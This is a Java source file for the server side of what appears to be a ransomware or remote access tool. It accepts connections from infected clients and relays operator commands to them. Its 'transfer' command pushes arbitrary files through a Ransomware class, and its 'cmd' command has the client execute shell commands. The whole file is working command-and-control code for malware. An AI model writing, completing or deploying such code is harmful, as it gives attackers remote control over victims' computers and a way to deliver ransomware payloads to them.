package sample;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.net.Socket;

public class Server extends Thread{
    private Socket connection;
    private final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
    private static int cont =0;
    public Server(Socket connection)throws Exception{
        this.connection = connection;
        consolePrint("[+]Client joined");
        increaseCont();
        consolePrint("[+]Total->"+cont);
        consolePrint("----------------------------");

    }
    public void sendCommand(String command)throws Exception{
            ObjectOutputStream data = new ObjectOutputStream(connection.getOutputStream());
            Ransomware ran= new Ransomware();
            data.writeUTF(command);
            data.flush();
            if(command.equals("transfer")){
                consolePrint("[?]File to be transfered");
                String filePath = bufferedReader.readLine();
                data.writeObject(ran.getFileBytes(filePath));
                data.flush();
                consolePrint("[?]Name for the file");
                String fileName = bufferedReader.readLine();
                data.writeUTF(fileName);
                data.flush();
                consolePrint("[+]File saved on client");
            }
            if(command.equals("cmd")){
                consolePrint("[?]Write cmd command to be executed");
                String cmd = bufferedReader.readLine();
                data.writeUTF(cmd);
                data.flush();
                consolePrint("[+]Command executed");
            }
            consolePrint("[+]Command "+ command+" Sent");

        consolePrint("----------------------------");
        //data.close();
    }
    public void closeSocket()throws Exception{
        connection.close();
        consolePrint("[+]Connection Closed Successfully");
        consolePrint("----------------------------");

    }
    public void checkConnection(){
        System.out.println(connection.isConnected());
    }
    public void setConnection(Socket connection) {
        this.connection = connection;
    }

    public Socket getConnection() {
        return connection;
    }
    public void consolePrint(String message){
        System.out.println(message);
    }
    public void decreaseCont(){
        cont-=1;
    }
    public void increaseCont(){
        cont+=1;
    }
    @Override
    public void run() {
        String command = "";
        Boolean flag = true;
        while(!command.equals("exit")){
            consolePrint("[?]Waiting for command");
            try {
                command = bufferedReader.readLine();
                sendCommand(command);
                //System.out.println(command);
            } catch (Exception e) {
                decreaseCont();
                consolePrint("[-]Client exited unexpectedly");
                flag=false;
                break;
            }
        }
        if(flag){
            decreaseCont();
            consolePrint("[-]Client exited successfully");
        }

        /*try {
            closeSocket();
        } catch (Exception e) {
            e.printStackTrace();
        }*/
    }
}
